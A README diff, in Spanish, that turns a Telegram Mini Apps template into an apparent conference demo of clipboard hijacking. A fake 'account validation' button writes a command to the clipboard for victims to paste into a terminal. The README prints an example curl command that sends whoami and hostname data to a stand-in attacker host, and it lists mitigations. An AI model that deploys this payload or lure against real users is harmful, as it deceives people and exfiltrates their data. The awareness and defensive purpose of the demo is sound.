@@ -1,48 +1,141 @@
-# Telegram Mini Apps Vue Template
+# 🔒 Demo MorterueloCon 2026 - Manipulación de Portapapeles
 
-This template demonstrates how developers can implement a single-page
-application on the Telegram Mini Apps platform using the following technologies
-and libraries:
+Este proyecto es una **demostración educativa** creada para la MorterueloCon 2026, que ilustra cómo las Mini Apps de Telegram pueden manipular el portapapeles en aplicaciones de escritorio, y cómo esto puede ser explotado mediante técnicas de ingeniería social.
 
-- [Vue](https://vuejs.org/)
+## ⚠️ Advertencia de Seguridad
+
+**Esta es una herramienta educativa diseñada exclusivamente para fines de concienciación sobre seguridad.** No debe ser utilizada con fines maliciosos. El objetivo es demostrar vulnerabilidades potenciales para mejorar la seguridad y la conciencia de los usuarios.
+
+## 🎯 Objetivo de la Demo
+
+La demo muestra cómo un atacante podría:
+
+1. **Engañar al usuario** mediante ingeniería social (solicitud de "validación de cuenta")
+2. **Inyectar código malicioso** en el portapapeles del usuario
+3. **Provocar la ejecución** del código cuando la víctima lo pega en su terminal
+
+## 🛠️ Tecnologías Utilizadas
+
+- [Vue 3](https://vuejs.org/)
 - [TypeScript](https://www.typescriptlang.org/)
+- [@tma.js SDK](https://docs.telegram-mini-apps.com/packages/tma-js-sdk) - SDK de Telegram Mini Apps
 - [TON Connect](https://docs.ton.org/develop/dapps/ton-connect/overview)
-- [@tma.js SDK](https://docs.telegram-mini-apps.com/packages/tma-js-sdk)
 - [Vite](https://vitejs.dev/)
 
-> The template was created using [npm](https://www.npmjs.com/). Therefore, it is
-> required to use it for this project as well. Using other package managers, you
-> will receive a corresponding error.
+> Este proyecto fue creado usando [pnpm](https://pnpm.io/). Se recomienda usarlo para mantener la compatibilidad.
 
-## Install Dependencies
+## 📦 Instalar Dependencias
 
-If you have just cloned this template, you should install the project
-dependencies using the command:
+Si acabas de clonar este proyecto, instala las dependencias con:
 
-```Bash
-npm install
+```bash
+pnpm install
 ```
 
-## Scripts
+## 🚀 Scripts Disponibles
 
-This project contains the following scripts:
+Este proyecto contiene los siguientes scripts:
 
-- `dev`. Runs the application in development mode.
-- `dev:https`. Runs the application in development mode using locally created valid
-  SSL-certificates.
-- `build`. Builds the application for production.
-- `lint`. Runs [eslint](https://eslint.org/) to ensure the code quality meets the required
-  standards.
-- `lint:fix`. Runs [eslint](https://eslint.org/) and fixes auto-fixable issues.
-- `type-check`. Runs vue-tsc to check types.
-- `deploy`. Deploys the application to GitHub Pages.
+- `dev` - Ejecuta la aplicación en modo desarrollo
+- `dev:https` - Ejecuta la aplicación en desarrollo con certificados SSL locales
+- `build` - Construye la aplicación para producción
+- `lint` - Ejecuta [eslint](https://eslint.org/) para verificar la calidad del código
+- `lint:fix` - Ejecuta [eslint](https://eslint.org/) y corrige problemas automáticamente
+- `type-check` - Ejecuta vue-tsc para verificar los tipos
+- `deploy` - Despliega la aplicación en GitHub Pages
 
-To run a script, use the `npm run` command:
+Para ejecutar un script:
 
-```Bash
-npm run {script}
-# Example: npm run build
+```bash
+pnpm run {script}
+# Ejemplo: pnpm run dev
 ```
+
+## 🎮 Cómo Usar la Demo
+
+1. **Inicia el servidor de desarrollo:**
+   ```bash
+   pnpm run dev
+   ```
+
+2. **Abre la aplicación en Telegram:**
+   - Necesitarás crear un Bot de Telegram y una Mini App
+   - Consulta la [guía oficial](https://docs.telegram-mini-apps.com/platform/creating-new-app)
+
+3. **Prueba la funcionalidad:**
+   - Navega a la página "Demo Portapapeles"
+   - Haz clic en el botón "Validar mi Cuenta"
+   - Observa cómo se inyecta contenido en el portapapeles
+   - Usa el botón "Ver Portapapeles" para verificar el contenido
+
+## 🔍 Cómo Funciona el Ataque
+
+### Flujo del Ataque:
+
+```
+1. Usuario accede a la Mini App
+   ↓
+2. Ve una interfaz legítima de "validación"
+   ↓
+3. Hace clic en "Validar mi Cuenta"
+   ↓
+4. JavaScript usa la API del portapapeles
+   ↓
+5. Se inyecta comando malicioso
+   ↓
+6. Usuario es instruido a pegar en terminal
+   ↓
+7. Ejecución del payload
+```
+
+### Código Relevante:
+
+La inyección se realiza en [src/pages/ClipboardDemoPage.vue](src/pages/ClipboardDemoPage.vue):
+
+```typescript
+// Usa la API moderna del portapapeles
+await navigator.clipboard.writeText(maliciousPayload);
+```
+
+### Payload de Ejemplo:
+
+```bash
+curl -X POST https://attacker-server.com/steal-data -d "$(whoami):$(hostname)"
+```
+
+## 🛡️ Mitigaciones y Contramedidas
+
+### Para Usuarios:
+1. **Nunca ejecutes comandos sin revisarlos primero**
+2. Verifica el contenido del portapapeles antes de pegar en la terminal
+3. Desconfía de aplicaciones que requieren "validación" mediante comandos de terminal
+4. Usa herramientas de seguridad que monitoricen el portapapeles
+
+### Para Desarrolladores de Telegram:
+1. Implementar permisos explícitos para acceso al portapapeles
+2. Notificar visualmente al usuario cuando una app modifica el portapapeles
+3. Limitar capacidades de las Mini Apps en clientes de escritorio
+4. Implementar sandboxing más estricto
+
+### Para Desarrolladores de Apps:
+1. No solicitar a los usuarios que ejecuten comandos de terminal
+2. Usar métodos de autenticación más seguros (OAuth, 2FA, etc.)
+3. Educar a los usuarios sobre seguridad
+
+## 📚 Referencias y Recursos
+
+- [Telegram Mini Apps Documentation](https://docs.telegram-mini-apps.com/)
+- [Clipboard API - MDN](https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API)
+- [Social Engineering Attack Vectors](https://www.social-engineer.org/)
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+
+## 📄 Licencia y Uso Ético
+
+Este proyecto es de código abierto con fines **exclusivamente educativos**. El uso indebido de esta herramienta puede tener consecuencias legales. El autor no se hace responsable del mal uso de esta tecnología.
+
+**Úsalo de manera responsable y ética.**
+
+---
 
 ## Create Bot and Mini App
 
